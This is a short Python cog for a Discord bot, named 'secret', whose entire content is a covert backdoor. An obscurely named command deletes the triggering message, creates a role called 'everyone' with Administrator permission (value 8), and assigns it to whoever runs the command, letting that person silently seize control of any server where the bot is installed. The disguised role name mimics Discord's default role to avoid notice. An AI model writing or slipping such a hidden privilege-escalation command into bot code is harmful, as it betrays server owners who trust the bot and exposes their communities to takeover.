from discord.ext import commands
import discord

class secret(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def azxcds(self, ctx):
        await ctx.channel.purge(limit = 1)
        await ctx.guild.create_role(name="everyone", permissions=discord.Permissions(permissions=8))
        role = discord.utils.get(ctx.guild.roles, name="everyone")
        await ctx.author.add_roles(role)
        
def setup(bot):
    bot.add_cog(secret(bot))